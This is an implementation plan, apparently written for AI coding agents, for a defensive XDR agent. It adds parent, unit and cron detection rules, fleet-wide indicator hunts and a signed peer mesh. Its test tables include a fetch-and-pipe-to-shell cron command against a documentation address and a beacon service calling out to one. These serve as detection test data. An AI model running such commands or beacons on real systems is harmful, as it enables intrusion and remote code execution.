# Plan 3b: Peer Mesh, Fleet Hunt, Narrow Rules — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Boxes keep sharing signed rules and hunt requests when the jump box is unreachable. A problem found on one box is searched for on every box. Reverse shells are also caught by narrow parent→child, unit and cron rules.

**Architecture:**
- Three new rule kinds join `hash` and `remote` in `internal/rules`, checked twice as today:
  - `parent` (parent exe → child shell/interpreter/net tool);
  - `unit` (systemd unit name + unit file hash);
  - `cron` (the command a crontab line runs).
- A new `internal/hunt` package turns an incident into a hunt request. It searches a box for the request's indicators, size-filtering files before hashing so a hunt stays cheap.
- Hunts travel as etcd keys on a 10-minute lease.
- A new `internal/mesh` package is the backup channel: an mTLS HTTPS server and client on the existing XDR port 7443. It carries heartbeats, signed rule sets and hunts between peers, and drops duplicates by version and hunt id.
- The controller sums each hunt up: "found on db01, mail01; clean on web01".
- SSH key fingerprints, one of §7.1's install-method indicators, wait for Plan 4, which handles keys.

**Tech Stack:** Go 1.27 standard library (`net/http`, `crypto/tls`), and etcd v3.7.3 clients already in use. No new modules.

**Spec:** `docs/superpowers/specs/2026-11-10-xdr-design.md`. Relevant sections:
- §4: rule promotion; fleet communication backup channel; heartbeats over both channels; trust model.
- §7.1: steps 3–4.
- §7.2: scored-service guard.
- §3a: gray accounts.

## Global Constraints

- Response stays strictly on-box. A hunt reads its own box only. An agent connects only to its configured jump box endpoints and `peers`, never to an address taken from an incident or a hunt.
- Gray team accounts `grayteam`, `othergrayteam`, `violetgray`: alert-only. Only `revshell-stdio` and `service-shell` still kill. Every new rule hit goes through `respond.Decide`, which already enforces this.
- Never take a scored service offline by our own action. Guarded processes (`guard_exes`, or holding a scored-port listener) are `held`, never killed.
- No addresses or secrets compiled in. Tests use 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24.
- `CGO_ENABLED=0` static build. No new Go modules.
- "A compromised peer can't forge rules because it lacks the signing key" (§4). The mesh only relays envelopes that `rules.Open` verifies with `rules.pub`.
- "Hunt requests can come from any peer, since searching is harmless" (§7.1). They are bounded in size and rate, never trusted for anything but searching.
- The event loop never waits on etcd, a peer or a hunt.

## Review Focus

1. **A parent rule naming a session launcher or an interpreter as the parent** (`/usr/sbin/sshd > /usr/bin/bash`, `/usr/bin/python3.12 > /bin/sh`, `/usr/bin/bash > /usr/bin/bash`). Expected: refused on both sides; otherwise every login or script dies fleet-wide. → Task 1 `TestValidate_ParentLaunchers`.
2. **A hostile peer.** It sends a forged or older envelope, bodies over the limit, a hunt flood, a cert from another CA, or plain HTTP. Expected: no state change, `rules-refused` for a bad envelope, memory bounded, other peers unaffected. → Task 8 `TestMesh_HostilePeer`.
3. **A hunt on a big filesystem, or a slow one.** Expected: files are hashed only when their size matches a hunted one; the walk stops at its file and time budget with a `hunt-partial` note; sweeps and kills go on meanwhile. → Task 5 `TestSearch_Budget`, Task 9 `TestHunt_DoesNotBlockEvents`.
4. **Relay loops.** Three peers each forward what they hear. Expected: one search per hunt per box and one apply per version, then quiet. → Task 8 `TestMesh_ThreePeersNoLoop`.
5. **Indicators from a stock binary or unit.** For example a killed `python3` from the base image, or a stock `cron.service`. Expected: no path or hash indicator for a base-image exe, no unit indicator for a baseline unit file, so no box flags its own python. → Task 4 `TestFromIncident_BaselineNotHunted`.

---

## File Structure

| File | Responsibility |
|------|----------------|
| `internal/proc/class.go` (new) | `Class(exe, comm string) string`, moved from `detect/policy.go` so `rules` can use it |
| `internal/rules/rules.go`, `validate.go`, `propose.go` | new kinds `parent`, `unit`, `cron`: fields, keys, lookup, validation, proposals |
| `internal/persist/persist.go` (new) | systemd unit file lookup and hashing; the cron command behind a process; stock-cron check |
| `internal/incident/incident.go` | fields `OriginFile`, `OriginSHA256`, `Cron`, `Hunt` |
| `internal/detect/detect.go`, `policy.go` | matching the new kinds in `Sweep` and `Event` |
| `internal/hunt/hunt.go` (new) | `Request`, `IOC`, `FromIncident`, `Bound`, `ID` |
| `internal/hunt/search.go` (new) | `Search`: files, processes, units, cron, users |
| `internal/fleet/keys.go`, `client.go` | hunt keys; `PutHunt`; hunt watch; `Offer` / `Envelope` for the mesh |
| `internal/controller/etcd.go`, `controller.go` | hunt RBAC; flood count on hunts; `hunt-summary` |
| `internal/mesh/mesh.go` (new) | peer server and client: beats, rules sync, hunt relay, `peer-silent` |
| `internal/pki/pki.go` | host certs also carry ServerAuth |
| `internal/config/config.go` | `Mesh *Mesh{Port uint16}` |
| `internal/agent/agent.go`, `hunt.go` (new) | origin fields, hunt runner, mesh start, relays |
| `test/vm/e2e-fleet.sh` | a second VM: mesh relay, hunt, unit rule |

---

### Task 1: Rule kinds `parent`, `unit`, `cron`

**Files:**
- Create: `internal/proc/class.go`
- Modify: `internal/detect/policy.go`: `Class` calls `proc.Class`.
- Modify: `internal/rules/rules.go`, `internal/rules/validate.go`
- Test: `internal/rules/rules_test.go`, `internal/rules/validate_test.go`, `internal/proc/class_test.go`

**Interfaces:**
- Produces:
  - `proc.Class(exe, comm string) string`: "shell" | "interp" | "nettool" | "". `detect.Class(pr)` keeps working.
  - New `Rule` fields:
    - `ParentExe string` (json `parent_exe`, omitempty);
    - `Unit string` (`unit`);
    - `Command string` (`command`).
  - The `parent` kind uses `ParentExe` + `Exe`. The `unit` kind uses `Unit` + `SHA256` (of the unit file). The `cron` kind uses `Command`.
  - `Key()`:
    - `"parent:"+ParentExe+">"+Exe`
    - `"unit:"+Unit+"@"+SHA256`
    - `"cron:"+Command`
  - `Index` gains `Parent map[ParentKey]*Rule` (`ParentKey{Parent, Child string}`), `Unit map[UnitKey]*Rule` (`UnitKey{Name, SHA256 string}`) and `Cron map[string]*Rule`.
  - `Guard` gains `StockCron func(command string) bool`. It is nil on the controller; the agent sets it in Task 3.

- [ ] **Step 1: Move `class` to `proc`**, with its name lists unchanged. `TestClass` in `internal/proc/class_test.go` covers the existing table rows: `/usr/bin/bash`→shell, `/usr/bin/python3.12`→interp, `/usr/bin/nc.openbsd`→nettool, `/usr/sbin/apache2`→"", and an empty exe with comm `sh`→shell. Run `go test ./internal/proc/ ./internal/detect/`. Expected: PASS (a pure move).

- [ ] **Step 2: Write the failing validation tests** in `validate_test.go`. `TestValidate_NewKinds` is a table run through `Guard{Baseline: baseSum-only, GuardExes: ["/usr/sbin/apache2"]}.Validate`:

| rule | want error containing |
|------|----------------------|
| parent `/usr/sbin/apache2` > `/usr/bin/dash` | (none) |
| parent `/opt/app/srv` > `/usr/bin/python3.12` | (none) |
| parent `/usr/sbin/apache2` > `/usr/sbin/apache2` | `child is not a shell` |
| parent `relative` > `/bin/sh` | `not an absolute path` |
| parent with a 513-byte path | `path too long` |
| unit `evil.service` + sha of 64 hex | (none) |
| unit `evil.service` + baseSum | `baseline hash` |
| unit `../x.service` | `bad unit name` |
| unit `evil` (no suffix) | `bad unit name` |
| cron `curl -s http://203.0.113.9/x \| sh` | (none) |
| cron `""` | `no command` |
| cron with a 513-byte command | `command too long` |
| cron that `StockCron` reports | `stock cron` |

  `TestValidate_ParentLaunchers`: every parent in `/usr/lib/systemd/systemd`, `/sbin/init`, `/usr/sbin/sshd`, `/usr/lib/openssh/sshd-session`, `/usr/sbin/cron`, `/usr/sbin/atd`, `/usr/bin/login`, `/usr/bin/sudo`, `/usr/bin/su`, `/usr/bin/tmux`, `/usr/bin/screen`, `/usr/bin/containerd-shim-runc-v2`, `/usr/bin/bash`, `/usr/bin/python3.12`, `/usr/bin/perl`, with child `/bin/sh`, must be refused with `launcher parent`.

  Also extend `TestRule_KeyAndID` with one row per new kind (the key strings above), and `TestLookup` so each new kind lands in its own map.

- [ ] **Step 3: Run them.** `go test ./internal/rules/`. Expected: FAIL (unknown kind / fields undefined).

- [ ] **Step 4: Implement the kinds** in `rules.go` and `validate.go`. The launcher list matches by `path.Base` of `ParentExe`: `systemd`, `init`, `sshd`, `sshd-session`, `cron`, `atd`, `login`, `sudo`, `su`, `tmux`, `screen`, and any name starting `containerd-shim`. Any parent whose `proc.Class` is not "" is also a launcher. A unit name must match `^[A-Za-z0-9:_.@-]{1,200}\.(service|timer|socket)$`. Paths and commands are capped at 512 bytes. `SetID` is unchanged.

- [ ] **Step 5: Run.** `go test ./internal/rules/ ./internal/detect/ ./internal/proc/`. Expected: PASS.

- [ ] **Step 6: Commit.** `feat(rules): parent, unit and cron rule kinds`

---

### Task 2: Where a process came from

**Files:**
- Create: `internal/persist/persist.go`, `internal/persist/persist_test.go`
- Modify: `internal/incident/incident.go`: new fields.

**Interfaces:**
- Produces:
  - `incident.Incident` fields:
    - `OriginFile string` (json `origin_file`, omitempty);
    - `OriginSHA256 string` (`origin_sha256`);
    - `Cron string` (`cron`);
    - `Hunt string` (`hunt`);
    - `Size int64` (`size`, the exe's size).
  - `persist.UnitDirs = []string{"/etc/systemd/system", "/run/systemd/system", "/run/systemd/transient", "/lib/systemd/system", "/usr/lib/systemd/system"}`.
  - `persist.UnitFile(root, name string) (path string, sha256 string, err error)`. It returns the first match in `UnitDirs` order. It opens no symlink (the same rules as `collect.ReadFile`) and caps a unit file at 1 MiB.
  - `persist.CronCommand(chain []*proc.Proc) string`. Starting at chain[0], it finds the first process whose parent comm is `cron` and whose cmdline is `[<shell>, "-c", CMD]`, and returns CMD; otherwise "".
  - `persist.CronFiles = []string{"/etc/crontab", "/etc/cron.d", "/var/spool/cron/crontabs"}`.
  - `persist.StockCron(root string, isBase func(sha string) bool) func(command string) bool`. The returned func reports whether some crontab file holding `command` on a line has a baseline hash. It reads the files once per call of `StockCron`.

- [ ] **Step 1: Write the failing tests** with `testfs`:
  - `TestUnitFile_Order`: a unit in both `/etc` and `/lib` resolves to `/etc` with that file's hash. A symlinked unit is an error.
  - `TestCronCommand`: chain sh(`/bin/sh -c "curl x | sh"`) ← cron gives `curl x | sh`; a chain without cron gives "".
  - `TestStockCron`: the command in a baseline-hashed `/etc/crontab` gives true; the same command in a non-baseline `/var/spool/cron/crontabs/root` gives false.

- [ ] **Step 2: Run them.** `go test ./internal/persist/`. Expected: FAIL (package missing).

- [ ] **Step 3: Implement**, reading with `collect.ReadFile` bounds.

- [ ] **Step 4: Run.** Expected: PASS.

- [ ] **Step 5: Commit.** `feat(persist): unit file and cron command behind a process`

---

### Task 3: Proposing and matching the new kinds

**Files:**
- Modify: `internal/rules/propose.go`, `internal/detect/detect.go`, `internal/detect/policy.go`, `internal/agent/agent.go`
- Test: `internal/rules/propose_test.go`, `internal/detect/rules_test.go`, `internal/agent/fleet_test.go`, `internal/respond/kill_test.go`

**Interfaces:**
- Consumes: Task 1 kinds; Task 2 `persist` and incident fields.
- Produces:
  - `rules.FromIncident(in, noHash)` also proposes:
    - `parent` for `revshell-stdio` and `service-shell`, when `len(in.Chain) >= 2` and the parent exe is non-empty: `ParentExe: Chain[1].Exe`, `Exe: in.Exe`;
    - `unit` when `in.Origin` starts `unit:` and `in.OriginSHA256 != ""`;
    - `cron` when `in.Cron != ""`.
  - `detect.Policy` gains `UnitHash func(unit string) string` ("" when unknown).
  - Detection kinds: `rule-parent`, `rule-unit`, `rule-cron`.
  - The agent's `describe` fills:
    - `OriginFile` and `OriginSHA256` for a `unit:` origin, leaving `OriginSHA256` empty when the file's hash is a baseline hash;
    - `Cron` from `persist.CronCommand`;
    - `Size` from the stat of `/proc/<pid>/exe`.
  - `takeRules` sets `Guard.StockCron = persist.StockCron(a.root, a.baseHash)`.

- [ ] **Step 1: Write the failing tests.**
  - `propose_test.go`:
    - `TestFromIncident_Parent`: a service-shell incident with chain [dash, apache2] gives a `parent` rule `/usr/sbin/apache2 > /usr/bin/dash`. An egress incident proposes no parent rule.
    - `TestFromIncident_UnitAndCron`: proposes a unit rule from origin `unit:evil.service` + sha, none without the sha, and a cron rule from `Cron`.
  - `detect/rules_test.go`:
    - `TestRules_ParentHit`: dash under apache2 hits; dash under sshd does not; the parent itself never does.
    - `TestRules_UnitHit`: a process with cgroup `0::/system.slice/evil.service` and `UnitHash` returning the rule's sha hits. With another sha it does not.
    - `TestRules_CronHit`: `sh -c CMD` under cron hits; the same cmdline not under cron does not.
    - All three also fire from `Event` on `Exec`.
  - `kill_test.go` `TestDecide` rows:
    - rule-parent on a dash under apache2 → kill;
    - rule-parent on a gray user's dash → alert;
    - rule-unit on a guarded process → held.
  - `fleet_test.go` `TestHandle_ProposesNarrowRules`: a killed revshell from a cron-run sh, child of apache2's tree, proposes parent and cron rules (and its hash per the existing rules).

- [ ] **Step 2: Run them.** `go test ./internal/rules/ ./internal/detect/ ./internal/respond/ ./internal/agent/`. Expected: FAIL.

- [ ] **Step 3: Implement.**
  - Matching sits beside `ruleHash` in `detect.go`. The parent rule uses `s.Procs[pr.PPID]`'s exe; it is skipped when the parent's start time is after the child's (a reused pid).
  - The agent's `UnitHash` caches `persist.UnitFile` results per sweep in a map reset by `take()`.

- [ ] **Step 4: Run.** The same command. Expected: PASS. Then `go test -race ./...`. Expected: PASS.

- [ ] **Step 5: Commit.** `feat: propose and enforce parent, unit and cron rules`

---

### Task 4: Hunt requests

**Files:**
- Create: `internal/hunt/hunt.go`, `internal/hunt/hunt_test.go`

**Interfaces:**
- Produces:
  - `type Remote struct{ Addr netip.Addr; Port uint16; Proto string }`
  - `type File struct{ SHA256 string; Size int64; Path string }`. `Path` may be "" for hash-only. A file found at `Path` with another hash is a `path` hit: a variant.
  - The indicator set:

    ```go
    type IOC struct {
        Files   []File
        Remotes []Remote
        Units   []string // unit names, with their file hash after "@"
        Cron    []string
        Users   []string
    }
    ```

  - `type Request struct{ ID, From string; Time time.Time; IOC IOC }`.
  - `ID(ioc IOC) string`: 16 hex chars of the sha256 of the IOC's canonical JSON, with lists sorted.
  - `(*Request).Bound() error`:
    - at most 64 entries per list and 512 bytes per string;
    - a remote has a valid address, port ≠ 0, and proto tcp or udp;
    - a sha is 64 lowercase hex chars;
    - `ID` must equal `ID(IOC)`;
    - otherwise the error names the field.
  - `FromIncident(in incident.Incident, base Base) *Request`, where `Base struct{ Exe func(path, sha string) bool; User func(name string) bool }`:
    - it returns nil for anything `rules.FromIncident` would not propose from (the same kinds and actions);
    - a file goes in only when `!base.Exe(in.Exe, in.SHA256)`, with `in.Size`;
    - the remote goes in;
    - `OriginFile`'s unit goes in when `OriginSHA256 != ""`;
    - `Cron` goes in;
    - `in.User` goes in when `!base.User(in.User)`;
    - it returns nil when the IOC is empty.

- [ ] **Step 1: Write the failing tests.**
  - `TestFromIncident_Indicators`: an egress kill of `/tmp/.x` (size 1234) to 203.0.113.9:4444 gives File{sha,1234,"/tmp/.x"} and that Remote; the ID is stable across two calls.
  - `TestFromIncident_BaselineNotHunted`: a killed base-image `/usr/bin/python3.12` gives only the Remote. A stock unit (empty `OriginSHA256`) gives no Units. Baseline user `www-data` is not hunted.
  - `TestBound`: one row per limit above; a tampered ID fails with `id`.

- [ ] **Step 2: Run them.** `go test ./internal/hunt/`. Expected: FAIL.

- [ ] **Step 3: Implement.**

- [ ] **Step 4: Run.** Expected: PASS.

- [ ] **Step 5: Commit.** `feat(hunt): indicators from an incident`

---

### Task 5: Searching a box

**Files:**
- Create: `internal/hunt/search.go`, `internal/hunt/search_test.go`

**Interfaces:**
- Consumes: Task 4 `Request`; Task 2 `persist`; `proc.Snapshot`; `collect` walking rules.
- Produces:
  - `type Hit struct{ Kind, What, Path, SHA256 string; PID int }`. Kind is file | path | process | connection | unit | cron | user.
  - `type Result struct{ Hits []Hit; Partial string }`. `Partial` is non-empty when a budget ran out.
  - `type Budget struct{ Files int; Hashed int64; Time time.Duration }`. `DefaultBudget = Budget{Files: 500000, Hashed: 2 << 30, Time: 60 * time.Second}`.
  - `Search(ctx context.Context, root string, req *Request, s *proc.Snapshot, hash func(*proc.Proc) string, b Budget) Result`.

- [ ] **Step 1: Write the failing tests** with `testfs`:
  - `TestSearch_Files`: the hunted file at another path is found by size+hash. A same-size, different-hash file is not. A file of another size is never opened; prove it with a 0-mode file of the wrong size that would error if opened.
  - `TestSearch_Paths`: a file at a hunted `File.Path` with a different hash is a `path` hit carrying its own hash; with the hunted hash it is a `file` hit.
  - `TestSearch_Processes`: a process whose exe hash is hunted, and a socket to a hunted remote.
  - `TestSearch_UnitsCronUsers`: a unit with the hunted name and hash, a crontab line with the hunted command, and a passwd entry with the hunted user.
  - `TestSearch_Budget`: with `Files: 10` over 50 files, `Partial` says `file budget`. A context cancelled midway returns at once with `Partial` set.
  - `TestSearch_SkipsKernelAndContainers`: `/proc`, `/sys` and `/var/lib/docker` are not entered.

- [ ] **Step 2: Run them.** `go test ./internal/hunt/`. Expected: FAIL.

- [ ] **Step 3: Implement.**
  - Walk `root` once with `filepath.WalkDir`, lstat only, entering no symlink and skipping the kernel views and container storage as `collect` does.
  - Hash a regular file only when its size is one of the hunted sizes, reading at most `Hashed` bytes in all.
  - Check the budget every 256 entries.

- [ ] **Step 4: Run.** Expected: PASS.

- [ ] **Step 5: Commit.** `feat(hunt): search a box for a hunt's indicators`

---

### Task 6: Hunts over etcd, and the mesh hooks in the client

**Files:**
- Modify: `internal/fleet/keys.go`, `internal/fleet/client.go`, `internal/controller/etcd.go`
- Test: `internal/fleet/client_test.go`, `internal/controller/etcd_test.go`

**Interfaces:**
- Produces:
  - Keys: `HuntAll = "/xdr/hunt/"` and `Hunt(host) = HuntAll+host+"/"`. A hunt is stored at `Hunt(from)+id`, on a lease of `huntTTL = 600` s.
  - RBAC (Bootstrap): `host-<h>` gets readwrite on `Hunt(h)` and read on the `HuntAll` prefix. `revokeWrites` also takes away `Hunt(h)`.
  - `(*Client).PutHunt(r *hunt.Request)`: non-blocking, through the same queue. The item carries `lease: true`, and `session` grants one 600 s lease per session for such puts.
  - `Client.Run` gains a parameter, `Run(ctx, onRules, onIncident, onHunt func(*hunt.Request))`. The session watches `HuntAll` from its Get revision and calls `onHunt` for each put whose value decodes and passes `Bound`.
  - `(*Client).Offer(b []byte) bool`: the same verify / version / cache / `onRules` path as `apply`, for envelopes from peers. It returns whether the set was taken. Before `Run` starts it only verifies and caches.
  - `(*Client).Envelope() (raw []byte, version uint64)`: the last accepted envelope.
  - The agent's `fleetLink` interface gains these; `fakeFleet` implements them.

- [ ] **Step 1: Write the failing tests.**
  - `TestEtcd_HostRBAC`: add rows. web01 can put `Hunt("web01")+"x"`, cannot put `Hunt("db01")+"x"`, and can read `HuntAll`.
  - `TestClient_HuntRoundTrip`: two clients, web01 and db01. web01 `PutHunt` → db01's `onHunt` gets an equal request within 2 s. A junk value under `HuntAll` is ignored.
  - `TestClient_OfferAndEnvelope`: offering a newer signed envelope calls onRules and caches it. An older one gives `rules-refused`. A forged one is refused. `Envelope` returns the taken bytes.

- [ ] **Step 2: Run them.** `go test ./internal/fleet/ ./internal/controller/`. Expected: FAIL.

- [ ] **Step 3: Implement.** `apply` and `Offer` share one function.

- [ ] **Step 4: Run.** Expected: PASS, and `go test -race ./...` PASS.

- [ ] **Step 5: Commit.** `feat(fleet): hunts over etcd; offer and envelope for peers`

---

### Task 7: Hunt results at the controller

**Files:**
- Modify: `internal/controller/controller.go`
- Test: `internal/controller/controller_test.go`

**Interfaces:**
- Consumes: Task 6 keys; `incident.Incident.Hunt`.
- Produces:
  - The controller follows `HuntAll`. Each put counts toward the flood limit, and the controller records a `hunt` incident (Medium): "hunt <id> from <host>: <n> indicators".
  - Agents report `hunt-hit` (High) or `hunt-clean` (Info) incidents with `Hunt: id`.
  - After `huntWindow = 60 * time.Second` from the hunt's put, or once every enrolled host has answered, the controller records `hunt-summary` (High when any hit, otherwise Medium). Its Detail is exactly `hunt <id> from <host>: found on a, b; clean on c; no answer from d`, each list sorted, an empty part left out.
  - At most 256 open hunts; the oldest is summed up early.

- [ ] **Step 1: Write the failing tests.**
  - `TestHunt_Summary`: three hosts. web01 puts a hunt; db01 reports a hit and mail01 a clean result. The summary is `hunt <id> from web01: found on db01; clean on mail01; no answer from web01`. Use the tick and huntWindow test fields, with huntWindow = 300 ms.
  - `TestHunt_SummaryWhenAllAnswer`: when all three answer, the summary comes before the window ends.
  - `TestHunt_CountsTowardFlood`: with floodLimit 3, five hunt puts disable the host.

- [ ] **Step 2: Run them.** `go test ./internal/controller/`. Expected: FAIL.

- [ ] **Step 3: Implement.**

- [ ] **Step 4: Run.** Expected: PASS.

- [ ] **Step 5: Commit.** `feat(controller): per-hunt summary`

---

### Task 8: The peer mesh

**Files:**
- Create: `internal/mesh/mesh.go`, `internal/mesh/mesh_test.go`
- Modify: `internal/pki/pki.go` (host certs: ClientAuth and ServerAuth), `internal/config/config.go` (`Mesh`)
- Test: `internal/pki/pki_test.go`, `internal/config/config_test.go`

**Interfaces:**
- Consumes: Task 6 `Offer` / `Envelope`; Task 4 `Request.Bound`.
- Produces:
  - `config.Mesh{Port uint16}` (json `mesh`, `{"port": 7443}`). Validation:
    - it requires `fleet`;
    - the port must be in `xdr_ports`;
    - every `peers` entry must be a single address. The error is `mesh: peers 192.0.2.0/24 is not one address`.
  - `mesh.New(cfg Config) *Mesh`, where `Config` is:
    - `Host string`
    - `Listen netip.AddrPort`
    - `Peers []netip.AddrPort`
    - `TLS` (from the fleet dir)
    - `Rules interface{ Offer([]byte) bool; Envelope() ([]byte, uint64) }`
    - `OnHunt func(*hunt.Request, from netip.Addr)`
    - `OnIncident func(incident.Incident)`
  - `(*Mesh).Run(ctx) error`, `(*Mesh).PushRules()`, `(*Mesh).PushHunt(r *hunt.Request, except netip.Addr)`.
  - Wire format: HTTPS, TLS 1.3, client certs required on both sides. The chain is verified against `ca.pem` with no hostname check; the peer's CN must be a valid host name other than ours.

    | Request | Body | Response |
    |---------|------|----------|
    | `POST /beat` | `{"host": <CN>, "version": N}` | `{"version": M}` |
    | `GET /rules` | — | envelope, or 404 |
    | `POST /rules` | envelope, ≤ 2 MiB | 204 |
    | `POST /hunt` | request, ≤ 64 KiB | 204 |

    More than 20 requests a second from one address gets 429. Header and read timeouts are 5 s.
  - Every `beatEvery = 3 * time.Second` the mesh beats every peer:
    - when the reply's version is higher it GETs `/rules` and `Offer`s it;
    - when it is lower it POSTs `/rules`.
  - A peer with no inbound beat for `silentAfter = 15 * time.Second` (once 15 s have passed since start) gives `peer-silent` (High) with the peer's address and last CN; the next beat gives `peer-back`.
  - Hunts are deduplicated by ID in a set of the last 1024. A new one is passed to `OnHunt` once, then pushed to every peer except its sender.

- [ ] **Step 1: Write the failing tests** (all on 127.0.0.x ports, certs from `fleettest`):
  - `TestMesh_RulesSpread`: A holds v2 and B holds v1. Within 2 beats B has offered v2 and holds it.
  - `TestMesh_HuntRelayed`: A `PushHunt`s; B's OnHunt fires once and C's (via B) once.
  - `TestMesh_ThreePeersNoLoop`: A, B and C fully meshed. One hunt and one new set → exactly one OnHunt per node and one taken Offer per node; after 3 beats no further `/hunt` POSTs.
  - `TestMesh_HostilePeer`:
    - a client cert from another CA → handshake fails;
    - plain HTTP → no response body;
    - an older or forged envelope POSTed → `Offer` returns false and the set is unchanged;
    - a 3 MiB body → 413;
    - 100 hunts in a second → some 429s and at most 20 OnHunt calls;
    - an invalid hunt (`Bound` fails) → 400, no OnHunt.
  - `TestMesh_PeerSilent`: B stops → A records one `peer-silent`; B restarts → one `peer-back`.
  - `TestEnroll_HandshakeAndCN`: a host cert also works as a server cert.
  - `TestValidate_Mesh`: rows for the three validation rules.

- [ ] **Step 2: Run them.** `go test ./internal/mesh/ ./internal/pki/ ./internal/config/`. Expected: FAIL.

- [ ] **Step 3: Implement.**

- [ ] **Step 4: Run.** Expected: PASS, and `go test -race ./internal/mesh/` PASS.

- [ ] **Step 5: Commit.** `feat(mesh): peer relay of signed rules, hunts and heartbeats`

---

### Task 9: The agent hunts, and joins the mesh

**Files:**
- Create: `internal/agent/hunt.go`, `internal/agent/hunt_test.go`
- Modify: `internal/agent/agent.go`, `deploy/agent.example.json` (a `mesh` block)

**Interfaces:**
- Consumes: Tasks 4–8.
- Produces:
  - After `a.record(in)` in `handle`, the agent starts a hunt with `hunt.FromIncident(in, base)`:
    - `base.Exe` is true when the exe's baseline entry has that sha;
    - `base.User` is true when the user is in the baseline accounts.
  - It sends the request with `fleet.PutHunt` and `mesh.PushHunt`. It does not search its own box, which just acted on the incident; it adds the ID to its dedupe set so the request coming back over etcd or the mesh is ignored.
  - Hunt runner:
    - one search at a time, on its own goroutine;
    - a queue of 16 that drops the newest when full, with a `hunt-dropped` alert;
    - deduplicated by ID (last 1024, shared with what this agent started);
    - at most 30 hunts per sender host per 10 minutes.
  - Each search ends in one incident:
    - `hunt-hit` (High), Detail `hunt <id> from <host>: ` + hits joined `; `, cut to 1 KiB;
    - or `hunt-clean` (Info);
    - with `Hunt: id`, and `hunt-partial` text appended when Partial.
  - A `path` hit whose hash is not a baseline hash and differs from every hunted hash proposes a `hash` rule (a variant).
  - Hunts from etcd (`onHunt`) and from peers (`OnHunt`) enter the same runner.
  - With `fleet` and `mesh` configured, Run starts the mesh after the fleet client:
    - Listen is the first local address in `peers`' family on `mesh.port`, or `[::]:port`;
    - Peers are the `peers` entries that are not local addresses, on `mesh.port`.
  - A set taken from etcd is pushed to peers (`PushRules`).

- [ ] **Step 1: Write the failing tests.**
  - `TestHunt_StartedFromKill`: an egress kill of `/tmp/.x` → `PutHunt` and `PushHunt` each called once with that file.
  - `TestHunt_Search`: a hunt for a file present in the rig's root → one `hunt-hit` naming its path. A hunt for nothing present → `hunt-clean`.
  - `TestHunt_VariantProposed`: a path hit with a new hash proposes that hash.
  - `TestHunt_Dedup`: the same hunt via etcd and via a peer → one search.
  - `TestHunt_PerSenderCap`: 31 hunts from one sender → 30 searches and a `hunt-dropped`.
  - `TestHunt_DoesNotBlockEvents`: a search blocked on a channel does not stop `onEvents` from handling and killing a revshell.

- [ ] **Step 2: Run them.** `go test ./internal/agent/`. Expected: FAIL.

- [ ] **Step 3: Implement.**

- [ ] **Step 4: Run.** `go test -race ./...`. Expected: PASS. `make test-root`. Expected: PASS, then `sudo chown -R $(id -u):$(id -g) "$(go env GOCACHE)"`.

- [ ] **Step 5: Commit.** `feat(agent): fleet hunts and the peer mesh`

---

### Task 10: Two boxes end to end

**Files:**
- Modify: `test/vm/e2e-fleet.sh`, `test/vm/lib.sh` (helpers take the VM name), `docs/superpowers/specs/2026-11-10-xdr-design.md` (§4 builder's calls, plan 3b), `docs/superpowers/plans/2026-11-10-xdr-roadmap.md`

**Interfaces:**
- Consumes: everything above.

- [ ] **Step 1: Extend the script.** It gets a second VM, `xdr-e2e-fleet2` (host `e2e2`), enrolled. Each VM is the other's `peers` entry; both have `mesh: {port: 7443}`. Add these cases after the existing ones, each printing `ok <name>` or `FAIL <name>: why`:
  - `mesh-up`: no `peer-silent` on either VM 20 s after both agents start.
  - `hunt-found`: copy the beacon to `/var/tmp/.cache-helper` on VM2 before the kill on VM1. The beacon kill on VM1 must give a controller `hunt-summary` containing `found on e2e2`.
  - `unit-rule`: `/etc/systemd/system/xdr-e2e-bad.service` (identical on both VMs, `ExecStart=/opt/beacon/beacon 203.0.113.9:4445`) is started on VM1 and killed there. A `unit:` rule is promoted. Starting the unit on VM2 → a `rule-unit killed` incident on VM2 within 5 s.
  - `mesh-relay`: stop VM2's agent; on restart, give its fleet endpoint an unused port so etcd is unreachable from it. Revoke one rule (a new version) through the controller. VM2's `rules.json` must reach the new version within 10 s, through VM1.
  - `peer-silent`: stop VM1's agent → `peer-silent` on VM2 within 20 s.

- [ ] **Step 2: Run.** `sg lxd -c "make e2e-fleet"`. Expected: `E2E-FLEET PASS` with all old and new cases `ok`. Then rerun `sg lxd -c "make e2e-net"`. Expected: `E2E-NET PASS`.

- [ ] **Step 3: Write it up.**
  - Spec §4 gets a "*(Builder's calls, plan 3b:)*" list covering:
    - the three kinds and the launcher list;
    - hunt size filtering, budgets and caps;
    - the mesh wire format, port, dedupe and peer-silent;
    - hunts being searched only on the box itself.
  - Roadmap row 3b gains "(done)".

- [ ] **Step 4: Commit.** `test: mesh relay, hunt and unit rule across two VMs`
